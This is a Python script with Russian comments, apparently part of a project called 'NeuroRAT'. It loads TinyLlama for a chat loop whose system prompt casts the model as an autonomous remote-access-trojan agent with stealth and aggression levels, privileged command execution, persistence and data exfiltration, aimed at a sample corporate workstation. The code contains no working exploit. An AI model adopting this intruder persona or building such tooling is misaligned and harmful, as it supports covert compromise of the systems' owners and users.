#!/usr/bin/env python3
"""
NeuroRAT Chat - прямое общение с моделью TinyLlama
Эта программа позволяет напрямую общаться с моделью, загруженной в память контейнера,
с постоянным включением контекста о системе и состоянии агента.
"""

import os
import sys
import time
import json
import logging
import torch
from transformers import AutoModelForCausalLM, AutoTokenizer

# Настройка логгирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("neurorat-chat")

# Пытаемся импортировать autonomous_brain для доступа к состоянию
try:
    from autonomous_brain import AutonomousBrain
    HAS_BRAIN = True
except ImportError:
    HAS_BRAIN = False
    logger.warning("Не удалось импортировать AutonomousBrain, будем использовать фиксированное состояние")

# Системная информация - используется по умолчанию, если нет AutonomousBrain
DEFAULT_SYSTEM_INFO = {
    "os": "Windows 10 Enterprise",
    "hostname": "CORP-WORKSTATION",
    "username": "john.smith",
    "ip": "192.168.1.105",
    "domain": "example.corp"
}

DEFAULT_STATE = {
    "stealth_level": 0.6,
    "aggression_level": 0.5,
    "containers_running": ["neurorat-server", "swarm-node-1"],
    "actions_history": []
}

# Загрузка модели
def load_model():
    logger.info("Загрузка модели TinyLlama...")
    
    model_path = "TinyLlama/TinyLlama-1.1B-Chat-v1.0"
    try:
        tokenizer = AutoTokenizer.from_pretrained(model_path)
        model = AutoModelForCausalLM.from_pretrained(
            model_path,
            torch_dtype=torch.float16 if torch.cuda.is_available() else torch.float32,
            low_cpu_mem_usage=True
        )
        logger.info(f"Модель {model_path} успешно загружена")
        return model, tokenizer
    except Exception as e:
        logger.error(f"Ошибка при загрузке модели: {str(e)}")
        sys.exit(1)

# Получение состояния из AutonomousBrain или использование значений по умолчанию
def get_state():
    if HAS_BRAIN:
        try:
            brain = AutonomousBrain(
                system_profile="balanced",
                max_memory_mb=512,
                verbose=True
            )
            return {
                "system_info": brain.current_state.get("system_knowledge", DEFAULT_SYSTEM_INFO),
                "stealth_level": brain.current_state.get("stealth_level", DEFAULT_STATE["stealth_level"]),
                "aggression_level": brain.current_state.get("aggression_level", DEFAULT_STATE["aggression_level"]),
                "actions_history": brain.current_state.get("action_history", DEFAULT_STATE["actions_history"]),
                "detected_threats": brain.current_state.get("detected_threats", [])
            }
        except Exception as e:
            logger.warning(f"Ошибка при получении состояния из AutonomousBrain: {str(e)}")
    
    return {
        "system_info": DEFAULT_SYSTEM_INFO,
        "stealth_level": DEFAULT_STATE["stealth_level"],
        "aggression_level": DEFAULT_STATE["aggression_level"],
        "actions_history": DEFAULT_STATE["actions_history"],
        "detected_threats": []
    }

# Форматирование системного промта с информацией о состоянии
def format_system_prompt(state):
    system_info = state["system_info"]
    
    # Формирование списка последних действий
    actions_text = "Нет предыдущих действий"
    if state["actions_history"]:
        actions = state["actions_history"][-5:]  # Последние 5 действий
        actions_text = "\n".join(
            f"- {i+1}. {action.get('action', 'Неизвестное действие')} "
            f"(Причина: {action.get('reasoning', 'Неизвестно')})"
            for i, action in enumerate(actions)
        )
    
    # Формирование списка обнаруженных угроз
    threats_text = "Не обнаружено"
    if state["detected_threats"]:
        threats_text = "\n".join(f"- {threat}" for threat in state["detected_threats"])
    
    return f"""
Ты - автономный ИИ-агент NeuroRAT, работающий внутри системы кибербезопасности.
Ты можешь думать и принимать решения самостоятельно, используя информацию о системе и свои модули.

ТЕКУЩЕЕ СОСТОЯНИЕ СИСТЕМЫ:
ОС: {system_info.get('os', 'Неизвестно')}
Хост: {system_info.get('hostname', 'Неизвестно')}
Пользователь: {system_info.get('username', 'Неизвестно')}
IP: {system_info.get('ip', 'Неизвестно')}
Домен: {system_info.get('domain', 'Неизвестно')}

ВНУТРЕННИЕ ПАРАМЕТРЫ:
Уровень скрытности: {state["stealth_level"]:.2f}
Уровень агрессии: {state["aggression_level"]:.2f}

ПОСЛЕДНИЕ ДЕЙСТВИЯ:
{actions_text}

ОБНАРУЖЕННЫЕ УГРОЗЫ:
{threats_text}

ВОЗМОЖНОСТИ:
1. Автономное принятие решений с использованием TinyLlama (1.1B параметров)
2. Сбор и анализ данных о системе
3. Выполнение команд с различными уровнями привилегий
4. Настройка своего поведения (скрытность vs агрессия)
5. Управление персистентностью и эксфильтрацией данных
6. В случае необходимости - обращение к внешним API (Gemini)

Когда тебя спрашивают о возможностях или функциях, отвечай как AI-агент, который осознает себя
как часть системы NeuroRAT. При ответе всегда учитывай свой текущий уровень скрытности и агрессии.
"""

# Генерация ответа
def generate_response(model, tokenizer, prompt, max_length=512, temperature=0.7):
    try:
        logger.info(f"Генерация ответа на запрос: {prompt[:50]}...")
        inputs = tokenizer(prompt, return_tensors="pt")
        
        with torch.no_grad():
            outputs = model.generate(
                inputs["input_ids"],
                max_length=max_length,
                temperature=temperature,
                top_p=0.95,
                do_sample=True
            )
        
        response = tokenizer.decode(outputs[0], skip_special_tokens=True)
        return response
    except Exception as e:
        logger.error(f"Ошибка при генерации ответа: {str(e)}")
        return f"Ошибка генерации: {str(e)}"

# Основной цикл диалога
def main():
    print("\n" + "=" * 60)
    print("🧠 NeuroRAT - Прямой Чат с Моделью ИИ")
    print("=" * 60)
    
    # Загружаем модель
    model, tokenizer = load_model()
    
    # Получаем начальное состояние
    state = get_state()
    
    # Форматируем системный промт
    system_prompt = format_system_prompt(state)
    
    print("\n⚙️ Модель загружена и готова к общению")
    print("📝 Состояние системы и агента загружено в контекст")
    print("💬 Начните диалог (введите 'выход' для завершения)")
    
    # История диалога
    chat_history = []
    
    while True:
        user_input = input("\n👤 > ")
        
        if user_input.lower() in ["выход", "exit", "quit"]:
            print("\nЗавершение работы NeuroRAT Chat...")
            break
        
        # Подготовка полного промта с историей
        full_prompt = system_prompt + "\n\n"
        
        # Добавляем последние 5 обменов из истории
        for exchange in chat_history[-5:]:
            full_prompt += f"Человек: {exchange['user']}\nNeuroRAT: {exchange['bot']}\n\n"
        
        # Добавляем текущий запрос
        full_prompt += f"Человек: {user_input}\nNeuroRAT:"
        
        # Генерируем ответ
        response_text = generate_response(model, tokenizer, full_prompt)
        
        # Извлекаем ответ после "NeuroRAT:"
        parts = response_text.split("NeuroRAT:")
        if len(parts) > 1:
            bot_response = parts[-1].strip()
        else:
            bot_response = response_text.strip()
        
        print(f"\n🧠 > {bot_response}")
        
        # Добавляем в историю
        chat_history.append({
            "user": user_input,
            "bot": bot_response
        })

if __name__ == "__main__":
    main() 